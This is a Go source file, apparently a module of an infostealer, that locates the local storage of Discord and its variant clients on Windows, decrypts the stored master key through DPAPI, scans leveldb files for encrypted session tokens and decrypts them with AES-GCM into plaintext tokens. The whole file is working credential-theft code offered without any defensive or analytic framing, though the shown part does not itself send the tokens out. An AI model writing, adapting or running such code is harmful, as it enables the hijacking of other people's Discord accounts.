package socials

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"syscall"
	"unsafe"
)

const (
	tokenPattern = `dQw4w9WgXcQ:([^\"]*)`
)

var (
	appData        = filepath.ToSlash(os.Getenv("APPDATA"))
	crypt32DLL     = syscall.NewLazyDLL("Crypt32.dll")
	kernel32DLL    = syscall.NewLazyDLL("Kernel32.dll")
	procDecrypt    = crypt32DLL.NewProc("CryptUnprotectData")
	procLocalFree  = kernel32DLL.NewProc("LocalFree")
	discordPaths   = map[string]string{
		"Discord":        filepath.Join(appData, "discord"),
		"Discord Canary": filepath.Join(appData, "discordcanary"),
		"Lightcord":      filepath.Join(appData, "Lightcord"),
		"Discord PTB":    filepath.Join(appData, "discordptb"),
	}
)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func DecryptWithDPAPI(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecrypt.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func ExtractEncryptedKey(data []byte) ([]byte, error) {
	type LocalState struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	var ls LocalState
	err := json.Unmarshal(data, &ls)
	if err != nil {
		return nil, err
	}
	ek, err := base64.StdEncoding.DecodeString(ls.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	return ek, nil
}

func DecryptData(encryptedData []byte, key []byte) (string, error) {
	et, err := base64.StdEncoding.DecodeString(string(encryptedData))
	if err != nil {
		return "", err
	}
	nonce := et[3:15]
	ep := et[15:]
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	decrypted, err := gcm.Open(nil, nonce, ep, nil)
	if err != nil {
		return "", err
	}
	return string(decrypted), nil
}

func getDiscordFiles(paths map[string]string) ([]string, error) {
	var filenames []string
	for _, p := range paths {
		leveldbPath := filepath.Join(p, "Local Storage", "leveldb")
		files, err := os.ReadDir(leveldbPath)
		if err != nil {
			return nil, err
		}
		for _, file := range files {
			if filepath.Ext(file.Name()) == ".ldb" || filepath.Ext(file.Name()) == ".log" {
				filenames = append(filenames, filepath.Join(leveldbPath, file.Name()))
			}
		}
	}
	return filenames, nil
}

func extractTokens(filenames []string) ([]string, error) {
	r, e := regexp.Compile(tokenPattern)
	if e != nil {
		return nil, e
	}
	var tokens []string
	for _, filename := range filenames {
		file, err := os.Open(filename)
		if err != nil {
			return nil, err
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		const bufferSize = 5 * 1024 * 1024
		b := make([]byte, bufferSize)
		scanner.Buffer(b, bufferSize)
		for scanner.Scan() {
			line := scanner.Text()
			sub := r.FindStringSubmatch(line)
			if len(sub) > 1 && sub[1] != "" {
				tokens = append(tokens, sub[1])
			}
		}
		if err := scanner.Err(); err != nil {
			return nil, err
		}
	}
	return tokens, nil
}

func getKey(path string) ([]byte, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	encryptedKey, err := ExtractEncryptedKey(data)
	if err != nil {
		return nil, err
	}
	masterKey, err := DecryptWithDPAPI(encryptedKey[5:])
	if err != nil {
		return nil, err
	}
	return masterKey, nil
}

func GetDiscordTokens() ([]string, error) {
	var allTokens []string
	for name, dir := range discordPaths {
		localStatePath := filepath.Join(dir, "Local State")
		key, err := getKey(localStatePath)
		if err != nil {
			continue
		}
		files, err := getDiscordFiles(map[string]string{name: dir})
		if err != nil {
			continue
		}
		encryptedTokens, err := extractTokens(files)
		if err != nil {
			continue
		}

		for _, et := range encryptedTokens {
			token, err := DecryptData([]byte(et), key)
			if err == nil {
				allTokens = append(allTokens, token)
			}
		}
	}
	return allTokens, nil
}
